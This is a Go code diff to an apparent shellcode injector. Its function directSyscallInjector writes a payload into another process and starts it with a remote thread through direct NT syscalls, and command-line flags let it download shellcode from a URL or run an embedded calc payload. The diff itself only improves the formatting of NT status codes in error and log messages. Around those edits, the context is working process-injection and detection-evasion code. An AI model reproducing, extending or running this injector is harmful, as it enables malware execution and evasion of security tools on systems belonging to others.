@@ -192,10 +192,10 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 	}
 
 	if status != winapi.STATUS_SUCCESS {
-		return fmt.Errorf("NtAllocateVirtualMemory failed: %#x", status)
+		return fmt.Errorf("NtAllocateVirtualMemory failed: %s", winapi.FormatNTStatus(status))
 	}
 
-	fmt.Printf("Allocated memory at %#x, status: %#x\n", remoteBuffer, status)
+	fmt.Printf("Allocated memory at %#x, status: %s\n", remoteBuffer, winapi.FormatNTStatus(status))
 
 	// NtWriteVirtualMemory using direct syscall library
 	var bytesWritten uintptr
@@ -213,14 +213,14 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 	}
 
 	if status != winapi.STATUS_SUCCESS {
-		return fmt.Errorf("NtWriteVirtualMemory failed: %#x", status)
+		return fmt.Errorf("NtWriteVirtualMemory failed: %s", winapi.FormatNTStatus(status))
 	}
 
 	if bytesWritten != uintptr(len(payload)) {
 		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
 	}
 
-	fmt.Printf("Wrote %d bytes, status: %#x\n", bytesWritten, status)
+	fmt.Printf("Wrote %d bytes, status: %s\n", bytesWritten, winapi.FormatNTStatus(status))
 
 	// NtCreateThreadEx using direct syscall library
 	var hThread uintptr
@@ -245,10 +245,10 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 	}
 
 	if status != winapi.STATUS_SUCCESS {
-		return fmt.Errorf("NtCreateThreadEx failed: %#x", status)
+		return fmt.Errorf("NtCreateThreadEx failed: %s", winapi.FormatNTStatus(status))
 	}
 
-	fmt.Printf("Created thread: %#x\n", status)
+	fmt.Printf("Created thread: %s\n", winapi.FormatNTStatus(status))
 
 	if hThread != 0 {
 		windows.CloseHandle(windows.Handle(hThread))
@@ -268,12 +268,32 @@ func main() {
 	urlFlag := flag.String("url", "", "URL to download shellcode from")
 	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode")
 	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")
+
 	flag.Parse()
 
 	// Check if dump flag is used
 	if *dumpFlag {
 		fmt.Println("Dumping all available syscalls from ntdll.dll...")
 		fmt.Println("=" + strings.Repeat("=", 79))
+		
+		// Demonstrate NT Status code formatting
+		fmt.Println("\nNT Status Code Examples:")
+		fmt.Println("------------------------")
+		exampleStatuses := []uintptr{
+			winapi.STATUS_SUCCESS,
+			winapi.STATUS_INFO_LENGTH_MISMATCH,
+			winapi.STATUS_INVALID_HANDLE,
+			winapi.STATUS_INVALID_PARAMETER,
+			winapi.STATUS_ACCESS_DENIED,
+			winapi.STATUS_NO_MEMORY,
+			0xC0000005, // STATUS_ACCESS_VIOLATION
+			0xC000001C, // STATUS_INVALID_PARAMETER_1
+		}
+		
+		for _, status := range exampleStatuses {
+			fmt.Printf("  %s\n", winapi.FormatNTStatus(status))
+		}
+		fmt.Println()
 		
 		syscalls, err := winapi.DumpAllSyscalls()
 		if err != nil {
@@ -348,6 +368,7 @@ func main() {
 		// Embedded calc shellcode
 		payload = getEmbeddedShellcode()
 		fmt.Printf("Using embedded calc shellcode (%d bytes)\n", len(payload))
+		fmt.Printf("NT Status formatting enabled: Success = %s\n", winapi.FormatNTStatus(winapi.STATUS_SUCCESS))
 	} else {
 		// Check if URL is provided
 		url := *urlFlag
